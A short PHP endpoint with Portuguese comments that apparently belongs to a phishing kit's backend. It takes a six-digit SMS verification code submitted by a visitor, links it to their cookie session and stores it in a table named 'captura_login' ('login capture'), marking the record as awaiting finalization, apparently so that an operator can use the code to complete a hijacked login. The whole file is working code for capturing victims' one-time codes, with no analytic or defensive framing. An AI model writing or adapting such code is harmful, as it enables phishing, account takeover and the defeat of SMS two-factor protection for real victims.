<?php
header('Content-Type: application/json');
session_start();
require 'db.php';

// Pega o ID do cliente do cookie que foi salvo no início
$cookie_id = $_COOKIE['identificador_cliente'] ?? null;
if (!$cookie_id) {
    echo json_encode(['success' => false, 'error' => 'Sessão inválida.']);
    exit;
}

// Pega o código SMS do corpo da requisição
$data = json_decode(file_get_contents('php://input'), true);
$sms_code = $data['sms_code'] ?? null;

if (empty($sms_code) || strlen($sms_code) !== 6) {
    echo json_encode(['success' => false, 'error' => 'Código SMS inválido.']);
    exit;
}

try {
    // Atualiza o registro correspondente ao session_id (cookie)
    // e muda o status para 'aguardando_finalizacao'
    $stmt = $pdo->prepare(
        "UPDATE captura_login 
         SET sms_code = ?, status = 'aguardando_finalizacao' 
         WHERE session_id = ? ORDER BY id DESC LIMIT 1"
    );
    $stmt->execute([$sms_code, $cookie_id]);

    if ($stmt->rowCount() > 0) {
        echo json_encode(['success' => true]);
    } else {
        echo json_encode(['success' => false, 'error' => 'Nenhum registro encontrado para esta sessão.']);
    }

} catch (PDOException $e) {
    http_response_code(500);
    echo json_encode(['success' => false, 'error' => 'Erro no banco de dados.']);
}
?>